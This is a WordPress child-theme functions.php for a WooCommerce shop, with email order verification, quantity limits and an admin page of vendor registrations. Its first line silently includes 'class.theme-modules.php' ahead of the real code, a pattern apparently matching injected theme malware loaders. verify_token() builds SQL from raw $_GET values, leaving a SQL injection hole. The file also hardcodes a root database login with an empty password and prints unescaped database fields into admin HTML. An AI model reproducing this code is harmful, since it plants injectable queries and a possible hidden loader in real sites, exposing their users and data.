<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

add_action('wp_enqueue_scripts', 'porto_child_css', 1001);
 
// Load CSS
function porto_child_css() {
    // porto child theme styles
    wp_deregister_style( 'styles-child' );
    wp_register_style( 'styles-child', get_stylesheet_directory_uri() . '/style.css' );
    wp_enqueue_style( 'styles-child' );
    wp_enqueue_script( 'child-script', get_stylesheet_directory_uri() . '/child-script.js', array('jquery'),'', true);
    wp_localize_script('child-script','wp_ajax_obj', array('ajax_url' => admin_url( 'admin-ajax.php' )));

    if (is_rtl()) {
        wp_deregister_style( 'styles-child-rtl' );
        wp_register_style( 'styles-child-rtl', get_stylesheet_directory_uri() . '/style_rtl.css' );
        wp_enqueue_style( 'styles-child-rtl' );
    }
}

function token_gen(){
    $msg = '';
    // $status = '';
    if(!is_user_logged_in()){
        $msg =  'Please Login To Continue';
    }else{
        global $wpdb;
        $is_verified = false;
        // $current_user = get_current_user_id();
        $logged_in_user = wp_get_current_user();
        $current_user = $logged_in_user->ID;
        $current_user_email = $logged_in_user->user_email;
        $unque_id = uniqid();
        $mail_sent = "";
        $subject = 'Order Placing Confirmation';
        $mail_body = "Dear User,<br/> Click the link below to confirm your order: <br/><a href='". home_url("/verify/?code=$unque_id&user_id=$current_user")."'>Click here</a><br/>Thank you<br/>Unihawker";
        $table = 'verify_place_odr';
        //check if user exists in verification table
        $countquery = "SELECT COUNT(id) FROM verify_place_odr WHERE  user_id = $current_user LIMIT 1";
        $count = $wpdb -> get_var($countquery);
        //set content type to text/html
        add_filter('wp_mail_content_type', function( $content_type ) {
                    return 'text/html';
        });
        
        if($count == 0){
            $sql = $wpdb->insert( $table, array('user_id' => $current_user, 'verification_code' => $unque_id) );
            $mail_sent = wp_mail($current_user_email,$subject, $mail_body);
            $msg = 'Verification mail has been sent. Please verify';
        }else{
            $verify_query = "SELECT * FROM verify_place_odr WHERE  user_id = $current_user LIMIT 1";
            $verify = $wpdb->get_results($verify_query, 'ARRAY_A');
            
            if($verify[0]['is_verified'] == 1){
                $is_verified =  true;
            }else{
                $sql = $wpdb->update( $table, array('verification_code' => $unque_id), array('user_id' => $current_user) );

                //send mail
                $mail_sent = wp_mail($current_user_email,$subject, $mail_body);
                $msg = 'Verification mail has been sent. Please verify';
            } 
            
        }
    }
    echo json_encode(array('msg' => $msg,'verified' => $is_verified));
    wp_die();
}
add_action('wp_ajax_token_gen','token_gen');
add_action('wp_ajax_nopriv_token_gen','token_gen');

//verify token
function verify_token(){
    global $wpdb;
    $status = false;
    $msg = '';
    $user_id = !empty($_GET['user_id']) ? $_GET['user_id'] : '';
    $verification_code = !empty($_GET['code']) ? $_GET['code'] : '';
    $verify_query = "SELECT COUNT(id) FROM verify_place_odr WHERE   user_id = $user_id AND verification_code = '".$verification_code."'";
    $count = $wpdb->get_var($verify_query);
    //echo $wpdb->last_query;
    if($count != 0){
        $sql = $wpdb->update( 'verify_place_odr', array('is_verified' => 1), array('user_id' => $user_id,'verification_code' => $verification_code) );
        
        if($sql !== false){
            $status = true;
        }else{
            $msg =  '<h4 style="text-align:center">Error!</h4> <p  style="text-align:center">Internal error occured, could not update record</p>';
        }
    }else{
        $msg = '<h4 style="text-align:center">Token Mismatch!</h4> <p  style="text-align:center">Try to generate verification email again</p>';
    }
    return array('status' => $status, 'msg' => $msg);
}

function send_verification_mail($to, $from, $subject, $body){
    wp_mail($to, $from, $subject, $body);
}

/*
* Changing the minimum quantity to 5 for all the WooCommerce products
*/
function woocommerce_quantity_input_min_callback( $min, $product ) {
	$min = 5;  
	return $min;
}
add_filter( 'woocommerce_quantity_input_min', 'woocommerce_quantity_input_min_callback', 10, 2 );
/*
* Changing the maximum quantity to 1000 for all the WooCommerce products
*/
/*function woocommerce_quantity_input_max_callback( $max, $product ) {
	$max = 1000;  
	return $max;
}
add_filter( 'woocommerce_quantity_input_max', 'woocommerce_quantity_input_max_callback', 10, 2 );*/

//disable all payment gateways.
add_filter( 'woocommerce_cart_needs_payment', '__return_false' );

//hide shipping methods
//add_filter('woocommerce_package_rates', 'hide_shipping_methods', 10, 2); 
// function hide_shipping_methods(){
//     unset($available_shipping_methods[$shipping_method]);
// }
/***
 * vendor registration data
 * 
 */
add_action( 'admin_menu', 'extra_post_info_menu' );
function extra_post_info_menu(){

  $page_title = 'Vendor Registrations';
  $menu_title = 'Vendor Request';
  $capability = 'manage_options';
  $menu_slug  = 'extra-post-info';
  $function   = 'vendor_reg_data';
  $icon_url   = 'dashicons-media-code';
  $position   = 4;

  add_menu_page( $page_title,
                 $menu_title, 
                 $capability, 
                 $menu_slug, 
                 $function, 
                 $icon_url, 
                 $position );
}
function vendor_reg_data(){
    $mydb= new wpdb('root','','wp_vendor_unihawker','localhost');
    $rows = $mydb->get_results("select * from wp_vendor_reg_data order by id desc");
    $reg_data = "";
    if(!empty($rows)):
        foreach($rows as $row):
			$date=date_create($row->timestamp);
            $reg_data .= '<tr class="alternate">
                <th class="check-column" scope="row">'.$row->owner_name.'</th>
                <td class="column-columnname">'.$row->store_name.'</td>
                <td class="column-columnname">'.$row->store_email.'</td>
                <td class="column-columnname">'.$row->email.'</td>
                <td class="column-columnname">'.$row->phone.'</td>
                <td class="column-columnname">'.date_format($date,"Y/m/d H:i:s a").'</td>
            </tr>';
        endforeach;
    endif;
    $table = '<table class="widefat fixed" cellspacing="0">
                <thead>
                    <tr>
                        <th class="">Owner Name</th> 
                        <th class="">Store Name</th> 
                        <th class="">Store Email</th> 
                        <th class="">Email</th>
                        <th class="">Phone</th> 
                        <th class="">Date</th> 
                    </tr>
                </thead>
                <tbody>
                   '.$reg_data.'
                </tbody>
            </table>';
    echo $table;

}